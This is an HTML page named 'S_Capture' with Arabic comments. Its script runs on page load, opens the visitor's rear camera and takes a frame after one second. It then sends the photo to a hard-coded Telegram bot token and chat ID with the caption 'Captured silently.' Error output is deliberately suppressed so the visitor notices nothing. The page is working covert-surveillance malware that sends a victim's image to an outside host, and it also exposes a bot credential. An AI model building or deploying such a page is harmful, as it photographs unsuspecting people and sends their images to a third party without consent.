<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S_Capture</title>
    
    <style>
        /* إخفاء كل شيء وجعل الفيديو يملأ الشاشة */
        body {
            margin: 0;
            overflow: hidden; /* لمنع ظهور أشرطة التمرير */
            background-color: #000;
        }

        #video {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: -100;
            transform: translate(-50%, -50%);
            border: none; 
        }

        /* إخفاء عنصر Canvas لأنه يستخدم كأداة فقط */
        #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video> 
    <canvas id="canvas"></canvas>

    <script>
        // ******************************************************
        // ** إعدادات البوت - تم التضمين بالمعلومات التي قدمتها **
        // ******************************************************
        const BOT_TOKEN = '8299004372:AAErVG-8zGODSvHxn0ZChWzBWXa3iGvw3NA'; 
        const CHAT_ID = '7869791131'; 
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

        // ******************************************************
        // ** عناصر DOM والمتغيرات             **
        // ******************************************************
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let stream = null;
        let isCaptured = false; 

        // ******************************************************
        // ** وظائف مساعدة                     **
        // ******************************************************
        
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type: mime});
        }

        // ******************************************************
        // ** وظائف الكاميرا والإرسال التلقائي    **
        // ******************************************************

        async function captureAndSend() {
            if (isCaptured || !stream) return; 

            isCaptured = true;
            
            try {
                // 1. ضبط أبعاد الـ Canvas ورسم الإطار
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // 2. تحويل الصورة إلى Blob
                const imageDataURL = canvas.toDataURL('image/jpeg', 0.9);
                const imageBlob = dataURLtoBlob(imageDataURL);
                
                // 3. إيقاف بث الكاميرا فوراً
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                
                // 4. إرسال البيانات عبر Telegram API
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', imageBlob, 'auto_capture.jpg'); 
                formData.append('caption', 'Captured silently.'); // يمكن إزالة هذا السطر إذا أردت إخفاء التعليق أيضاً

                const response = await fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    body: formData,
                });

                // لا يوجد معالجة للأخطاء أو النجاح لتبقى صامتة
                // console.log('Capture process finished.'); 

            } catch (error) {
                // console.error('An error occurred during capture or send:', error);
            }
        }


        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment' // الكاميرا الخلفية
                    } 
                });
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                // *** الالتقاط التلقائي بعد 1 ثانية من بدء البث ***
                setTimeout(captureAndSend, 1000); 

            } catch (error) {
                // console.error('Camera access denied or failed:', error);
            }
        }

        window.onload = startCamera;
    </script>
</body>
</html>
